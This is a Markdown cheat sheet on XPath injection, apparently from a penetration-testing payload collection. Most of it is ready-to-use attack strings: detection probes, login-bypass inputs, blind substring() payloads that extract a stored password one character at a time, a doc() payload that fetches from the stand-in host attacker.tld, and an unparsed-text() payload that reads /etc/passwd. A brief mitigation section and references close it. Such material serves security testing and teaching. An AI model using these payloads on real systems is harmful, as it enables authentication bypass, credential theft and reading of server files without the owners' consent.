# XPATH Injection

> XPATH Injection abuses queries built by concatenating user input into XPATH expressions that retrieve data from XML documents.

## Summary

- [Detection](#detection)
- [Authentication Bypass](#authentication-bypass)
- [Blind XPATH](#blind-xpath)
- [XPATH 2.0+ Features](#xpath-20-features)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

```
'
"
[
]
(
)
//
and 1=1
and 1=2
' or '1'='1
' or 1=1 or '
```

Errors mentioning `xpath`, `XPathException`, `<xsl>`, `XQuery` confirm.

## Authentication Bypass

Assume query: `//users/user[username/text()='USER' and password/text()='PASS']`.

```
USER: ' or '1'='1
PASS: ' or '1'='1
```

→ `//users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']`

Variants:

```
admin' or '1'='1
admin' or 1=1 or 'a'='a
admin']/*[1 or '
') or ('a'='a
') or 1=1 or ('
admin' or count(/)>0 or '
```

## Blind XPATH

Iterate characters using `substring()`:

```
' or substring(//user[1]/password,1,1)='a' or '
' or substring(//user[1]/password,1,1)='b' or '
...
```

Detect node names without knowing the schema:

```
' or name(/*[1])='u' or '
' or starts-with(name(/*[1]),'u') or '
' or string-length(name(/*[1]))=4 or '
' or count(//user)>0 or '
```

Boolean differential responses (success vs failure) reveal each character.

## XPATH 2.0+ Features

If the target supports XPATH 2.0:

- `doc()` reads external files (similar to XXE):

```
' or doc('http://attacker.tld/x.xml')//* or '
```

- `unparsed-text()`:

```
' or unparsed-text('file:///etc/passwd') or '
```

- `if/then/else`:

```
' or (if (substring(//user[1]/password,1,1)='a') then 1 else 0)=1 or '
```

## Mitigation

- **Parameterize** XPATH queries (e.g., `XPathExpression` with variables in Java, or use a safer query builder).
- Escape user input — single quotes, double quotes, brackets.
- Use **least-privilege** — XML stores rarely need to hold authentication secrets.
- Consider migrating away from XML for authentication; database-backed auth is the norm.

## References

- [OWASP — XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [HackTricks — XPATH](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
